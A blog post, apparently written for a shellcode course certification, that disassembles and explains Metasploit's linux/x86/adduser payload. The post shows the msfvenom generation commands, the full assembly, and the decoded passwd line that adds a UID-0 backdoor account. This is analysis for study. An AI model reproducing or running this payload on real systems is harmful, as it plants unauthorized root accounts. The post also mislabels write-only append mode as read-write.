@@ -1,0 +1,390 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Brett Lischalk | SLAE Problem 5.2: Msfvenom Analysis of linux/x86/adduser</title>
+  <meta name="description" content="Analysis of Msfvenom shellcode samples">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="SLAE Problem 5.2: Msfvenom Analysis of linux/x86/adduser">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="http://brettlischalk.com//posts/slae-problem-5-2-msfvenom-analysis">
+  <meta property="og:description" content="Analysis of Msfvenom shellcode samples">
+  <meta property="og:site_name" content="Brett Lischalk">
+  <meta property="og:image" content="http://brettlischalk.com//assets/og-image.jpg">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="http://brettlischalk.com//posts/slae-problem-5-2-msfvenom-analysis">
+  <meta name="twitter:title" content="SLAE Problem 5.2: Msfvenom Analysis of linux/x86/adduser">
+  <meta name="twitter:description" content="Analysis of Msfvenom shellcode samples">
+  <meta name="twitter:image" content="http://brettlischalk.com//assets/og-image.jpg">
+
+  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+  <link href="http://brettlischalk.com//feed.xml" type="application/rss+xml" rel="alternate" title="Brett Lischalk Last 10 blog posts" />
+
+  
+    <link type="text/css" rel="stylesheet" href="/assets/dark.css">
+  
+</head>
+
+<body>
+  <main role="main">
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav reveal">
+  <a href="/" class="header-logo" title="Brett Lischalk">Brett Lischalk</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <span class="icon icon-android-person"></span>
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/blischalk" target="_blank" title="Twitter">
+          <span class="icon icon-social-twitter"></span>
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a href="https://github.com/blischalk" target="_blank" title="GitHub">
+          <span class="icon icon-social-github"></span>
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/brett-lischalk-3104537" target="_blank" title="LinkedIn">
+          <span class="icon icon-social-linkedin"></span>
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a href="mailto:brett@brettlischalk.com" target="_blank" title="Email">
+          <span class="icon icon-at"></span>
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="/feed.xml" target="_blank" title="RSS">
+          <span class="icon icon-social-rss"></span>
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+        <article class="article reveal">
+          <header class="article-header">
+            <h1>SLAE Problem 5.2: Msfvenom Analysis of linux/x86/adduser</h1>
+            <div class="article-list-footer">
+              <span class="article-list-date">
+                January 3, 2017
+              </span>
+              <span class="article-list-divider">-</span>
+              <span class="article-list-minutes">
+                
+                
+                  6 minute read
+                
+              </span>
+              <span class="article-list-divider">-</span>
+              <div class="article-list-tags">
+                
+                  <a href="/tag/asm">asm</a>
+                
+                  <a href="/tag/shellcode">shellcode</a>
+                
+                  <a href="/tag/msfvenom">msfvenom</a>
+                
+              </div>
+            </div>
+          </header>
+
+          <div class="article-content">
+            <p>This blog post has been created for completing the requirements for the SecurityTube
+Linux Assembly Expert certification:
+<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert"><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></a></p>
+
+<p>Student ID: SLAE-824</p>
+
+<h2 id="requirements">Requirements</h2>
+
+<ul>
+  <li>Choose at least 3 shellcode samples created using Msfvenom for linux/x86</li>
+  <li>Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode</li>
+  <li>Present your analysis</li>
+</ul>
+
+<h3 id="analysis">Analysis</h3>
+
+<p>The next shellcode I would like to look at is linux/x86/adduser. My prediction
+for this shellcode is that it essentially just runs execve with
+<code class="highlighter-rouge">/usr/sbin/adduser</code> and the arguments that it would require. Lets analyze the
+assembly to find out!</p>
+
+<p>Running:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom --payload linux/x86/adduser --payload-options</code></pre></figure>
+
+<p>We see:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+PASS   metasploit       yes       The password <span class="k">for </span>this user
+SHELL  /bin/sh          no        The shell <span class="k">for </span>this user
+USER   metasploit       yes       The username to create</code></pre></figure>
+
+<p>The username and password both default to <code class="highlighter-rouge">metasploit</code> and
+the shell the user will be assigned will be /bin/sh. We will
+most likely find these values as arguments to execve if our
+prediction is correct. Lets export the shellcode:</p>
+
+<p>Running <code class="highlighter-rouge">msfvenom --payload linux/x86/adduser R &gt; adduser.bin</code> we
+create our shellcode to analyze. Using <code class="highlighter-rouge">ndisasm -u adduser.bin</code> we get
+the following assembly for analysis:</p>
+
+<h3 id="linuxx86adduser-shellcode-asm">/linux/x86/adduser Shellcode ASM</h3>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="c">;; 0x46       = 70</span>
+<span class="c">;; syscall 70 = sys_setreuid</span>
+<span class="c">;; man 2 setreuid looks like the following</span>
+<span class="c">;; int setreuid(uid_t ruid, uid_t euid);</span>
+<span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
+<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">ecx</span>
+<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x46</span>
+<span class="k">pop</span> <span class="n">eax</span>
+<span class="k">int</span> <span class="mh">0x80</span></code></pre></figure>
+
+<p>As illustrated in the comments, the above chunk of assembly
+sets the real and effective user id of of the process to be
+0 which elevates the privileges.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="c">;; 0x5       = 5</span>
+<span class="c">;; syscall 5 = sys_open</span>
+<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x5</span>
+<span class="k">pop</span> <span class="n">eax</span>
+
+<span class="c">;; Clear out ecx</span>
+<span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
+<span class="c">;; Push 0x00000000</span>
+<span class="c">;; This will null terminate our string</span>
+<span class="k">push</span> <span class="n">ecx</span>
+
+<span class="c">;; Build up a file as a string to open</span>
+<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x64777373</span> <span class="c">;; ‘dwss’</span>
+<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x61702f2f</span> <span class="c">;; ‘ap//‘</span>
+<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x6374652f</span> <span class="c">;; ‘cte/‘</span>
+
+<span class="c">;; Move a pointer to our file to open into ebx</span>
+<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">esp</span>
+
+<span class="c">;; Increment ecx to 0x00000001</span>
+<span class="k">inc</span> <span class="n">ecx</span>
+
+<span class="c">;; And move 0x4 into the high byte of cx</span>
+<span class="c">;; making cx 0x0401 as the flags passed to the open call</span>
+<span class="k">mov</span> <span class="n">ch</span><span class="p">,</span><span class="mh">0x4</span>
+<span class="k">int</span> <span class="mh">0x80</span></code></pre></figure>
+
+<p>The next chunk of assembly calls open. This opens the <code class="highlighter-rouge">/etc/passwd</code>
+file with the flags of 0x0401. What does 0x0401 stand for? Well,
+looking in <code class="highlighter-rouge">/usr/include/asm-generic/fcntl.h</code> we see:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">define O_WRONLY        00000001
+.. snip ..
+define O_APPEND        00002000</code></pre></figure>
+
+<p>The values specified in this header file are defined in octal. Our assembly is
+using hex so we do a bit of conversion using gdb:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gdb --batch --ex <span class="s2">"print /o 0x0401"</span></code></pre></figure>
+
+<p>This tells us that our hex value actually equals 02001 in octal of which doing
+00000001 | 00002000 = 00002001 or O_WRONLY | O_APPEND. This  indicates that we
+have opened the file for reading and writing and in append mode. This will
+ensure that the cursor is placed at the end of the file.</p>
+
+<p>The next chunk of code gets interesting. We need the memory offsets
+to help us a bit:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">00000025</span>  <span class="mi">93</span>                <span class="k">xchg</span> <span class="n">eax</span><span class="p">,</span><span class="n">ebx</span>
+<span class="mi">00000026</span>  <span class="n">E828000000</span>        <span class="k">call</span> <span class="n">dword</span> <span class="mh">0x53</span>
+<span class="mi">0000002</span><span class="n">B</span>  <span class="mi">6</span><span class="n">D</span>                <span class="k">insd</span>
+<span class="mi">0000002</span><span class="n">C</span>  <span class="mi">657461</span>            <span class="n">gs</span> <span class="k">jz</span> <span class="mh">0x90</span>
+<span class="mi">0000002</span><span class="n">F</span>  <span class="mi">7370</span>              <span class="k">jnc</span> <span class="mh">0xa1</span>
+<span class="mi">00000031</span>  <span class="mi">6</span><span class="n">C</span>                <span class="k">insb</span>
+<span class="mi">00000032</span>  <span class="mi">6</span><span class="n">F</span>                <span class="k">outsd</span>
+<span class="mi">00000033</span>  <span class="mi">69743</span><span class="n">A417A2F6449</span>  <span class="k">imul</span> <span class="n">esi</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="n">edi</span><span class="o">+</span><span class="mh">0x41</span><span class="err">]</span><span class="p">,</span><span class="n">dword</span> <span class="mh">0x49642f7a</span>
+<span class="mi">0000003</span><span class="n">B</span>  <span class="mi">736</span><span class="n">A</span>              <span class="k">jnc</span> <span class="mh">0xa7</span>
+<span class="mi">0000003</span><span class="n">D</span>  <span class="mi">3470</span>              <span class="k">xor</span> <span class="n">al</span><span class="p">,</span><span class="mh">0x70</span>
+<span class="mi">0000003</span><span class="n">F</span>  <span class="mi">3449</span>              <span class="k">xor</span> <span class="n">al</span><span class="p">,</span><span class="mh">0x49</span>
+<span class="mi">00000041</span>  <span class="mi">52</span>                <span class="k">push</span> <span class="n">edx</span>
+<span class="mi">00000042</span>  <span class="mi">633</span><span class="n">A</span>              <span class="k">arpl</span> <span class="p">[edx],</span><span class="n">di</span>
+<span class="mi">00000044</span>  <span class="mi">303</span><span class="n">A</span>              <span class="k">xor</span> <span class="p">[edx],</span><span class="n">bh</span>
+<span class="mi">00000046</span>  <span class="mi">303</span><span class="n">A</span>              <span class="k">xor</span> <span class="p">[edx],</span><span class="n">bh</span>
+<span class="mi">00000048</span>  <span class="mi">3</span><span class="n">A2F</span>              <span class="k">cmp</span> <span class="n">ch</span><span class="p">,[edi]</span>
+<span class="mi">0000004</span><span class="n">A</span>  <span class="mi">3</span><span class="n">A2F</span>              <span class="k">cmp</span> <span class="n">ch</span><span class="p">,[edi]</span>
+<span class="mi">0000004</span><span class="n">C</span>  <span class="mi">62696</span><span class="n">E</span>            <span class="k">bound</span> <span class="n">ebp</span><span class="p">,</span><span class="err">[</span><span class="n">ecx</span><span class="o">+</span><span class="mh">0x6e</span><span class="err">]</span>
+<span class="mi">0000004</span><span class="n">F</span>  <span class="mi">2</span><span class="n">F</span>                <span class="k">das</span>
+<span class="mi">00000050</span>  <span class="mi">7368</span>              <span class="k">jnc</span> <span class="mh">0xba</span>
+<span class="mi">00000052</span>  <span class="mi">0</span><span class="n">A598B</span>            <span class="k">or</span> <span class="n">bl</span><span class="p">,</span><span class="err">[</span><span class="n">ecx</span><span class="o">-</span><span class="mh">0x75</span><span class="err">]</span>
+<span class="mi">00000055</span>  <span class="mi">51</span>                <span class="k">push</span> <span class="n">ecx</span>
+<span class="mi">00000056</span>  <span class="n">FC</span>                <span class="k">cld</span>
+<span class="mi">00000057</span>  <span class="mi">6</span><span class="n">A04</span>              <span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x4</span>
+<span class="mi">00000059</span>  <span class="mi">58</span>                <span class="k">pop</span> <span class="n">eax</span>
+<span class="mi">0000005</span><span class="n">A</span>  <span class="n">CD80</span>              <span class="k">int</span> <span class="mh">0x80</span></code></pre></figure>
+
+<p>The xchg is our usual saving of the file descriptor
+returned in eax. We then see a <code class="highlighter-rouge">call dword 0x53</code> and then
+things start to get messy. We know about the jump call pop
+technique from our SLAE course, maybe this call is leveraging
+the fact that the next address will be popped on the stack. Looking
+at the offsets in our disassembly and checking out the bytes from
+0x53 on, we see <code class="highlighter-rouge">59 8B 51 fC 6A 04 58 CD 80</code>. Leveraging this
+wonderful online <a href="assembler / disassembler">https://defuse.ca/online-x86-assembler.htm#disassembly2</a>
+we learn what those bytes represent:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">0:  59                      pop    ecx
+1:  8b 51 <span class="nb">fc                </span>mov    edx,DWORD PTR <span class="o">[</span>ecx-0x4]
+4:  6a 04                   push   0x4
+6:  58                      pop    eax
+7:  <span class="nb">cd </span>80                   int    0x80</code></pre></figure>
+
+<p>Sure enough the address of the next instruction that was placed on the stack
+from our <code class="highlighter-rouge">call</code> instruction is popped into ecx. An offset from that value
+is placed in edx which we will need to investigate a bit and then the
+0x4 system call. Looking in <code class="highlighter-rouge">/usr/include/i386-linux-gnu/asm/unistd_32.h</code> we see
+that this is <code class="highlighter-rouge">#define __NR_write 4</code>.</p>
+
+<p>This makes sense. We just opened the /etc/passwd file and now we want to add
+stuff to it. The write syscall signature looks like:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">ssize_t</span> <span class="n">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">)</span></code></pre></figure>
+
+<p>This means edx is the length of what is being written, ecx is the string
+we want to write, ebx is the file descriptor to /etc/passwd and eax is our
+write sys call number. So what would that offset from ecx equate to?
+Zooming in on those bytes:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">00000026  E828000000        call dword 0x53
+0000002B  6D &lt;--- ecx is pointing here</code></pre></figure>
+
+<p>Moving backward 4 bytes from the 0x6D puts us at 0x28. This is the value
+that is being used as the length of the buffer in the write syscall.</p>
+
+<p>Converting 0x28 to decimal using gdb:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gdb --batch --ex <span class="s2">"print /d 0x28"</span>
+<span class="nv">$1</span> <span class="o">=</span> 40</code></pre></figure>
+
+<p>We see that 40 bytes is going to be written. Using GDB again:
+<em>Note: 0x2B is the beginning of the gibberish, 0x28 is the 40 bytes
+we just calculated.</em></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gdb --batch --ex <span class="s2">"print /x 0x2B + 0x28"</span>
+<span class="nv">$1</span> <span class="o">=</span> 0x53</code></pre></figure>
+
+<p>We see that 0x53 is 40 bytes after our call instruction and is exactly
+the byte that was referenced in the call command:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">00000026  E828000000 call dword 0x53</code></pre></figure>
+
+<p>Ok… Lets checkout the bytes of that gibberish and
+see what they might translate to as ascii:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">6D65746173706C6F69743A417A2F6449736A3470344952633A303A3A2F3A2F62696E2F73680A
+
+Converted to ascii outputs:
+
+metasploit:Az/dIsj4p4IRc:0::/:/bin/sh</code></pre></figure>
+
+<p>Ok. That makes sense. This is the line that will be appended to the /etc/passwd
+file in the format that linux would expect, e.g
+<code class="highlighter-rouge">username:passwd:UID:GID:full_name:directory:shell</code>. The user, shell, and
+presumably password all match up with the configuration that the payload
+defaults to.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x1</span>
+<span class="k">pop</span> <span class="n">eax</span>
+<span class="k">int</span> <span class="mh">0x80</span></code></pre></figure>
+
+<p>Finally we call exit to exit gracefully. So it turns out that my prediction was
+completely inaccurate. Execve was not used to execute the <code class="highlighter-rouge">adduser</code> command.</p>
+
+<p>¯\<em>(ツ)</em>/¯</p>
+
+          </div>
+
+          <div class="article-share">
+            
+            <a href="" title="Share on Twitter" onclick="window.open('https://twitter.com/home?status=SLAE Problem 5.2: Msfvenom Analysis of linux/x8... - http://brettlischalk.com//posts/slae-problem-5-2-msfvenom-analysis by @blischalk', 'newwindow', 'width=500, height=225'); return false;">
+              <span class="icon icon-social-twitter"></span>
+            </a>
+            <a href="" title="Share on Facebook" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=http://brettlischalk.com//posts/slae-problem-5-2-msfvenom-analysis', 'newwindow', 'width=500, height=500'); return false;">
+              <span class="icon icon-social-facebook"></span>
+            </a>
+            <a href="" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=http://brettlischalk.com//posts/slae-problem-5-2-msfvenom-analysis', 'newwindow', 'width=550, height=400'); return false;">
+              <span class="icon icon-social-googleplus"></span>
+            </a>
+          </div>
+
+          <a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional" target="_blank">
+            <img src="/assets/offsec-student-certified-emblem-rgb-oscp.png" />
+          </a>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script>
+              (function() {
+                  var d = document, s = d.createElement('script');
+                  s.src = '//blischalkblog.disqus.com/embed.js';
+                  s.setAttribute('data-timestamp', +new Date());
+                  (d.head || d.body).appendChild(s);
+              })();
+            </script>
+            <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+          
+        </article>
+        <footer class="footer reveal">
+  <p>
+    Site content by: <a href="/about" title="About me">Brett Lischalk</a>.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  <script type="text/javascript" src="/assets/vendor.js"></script>
+<script type="text/javascript" src="/assets/application.js"></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.16/webfont.js"></script>
+<script>
+  WebFont.load({
+    google: {
+      families: ['Cormorant Garamond:700', 'Lato:300,400,700']
+    }
+  });
+</script>
+
+
+  <script>
+    window.ga=function(){ga.q.push(arguments)};ga.q=[];ga.l=+new Date;
+    ga('create','UA-4121143-2','auto');ga('send','pageview')
+  </script>
+  <script src="https://www.google-analytics.com/analytics.js" async defer></script>
+
+
+</body>
+</html>
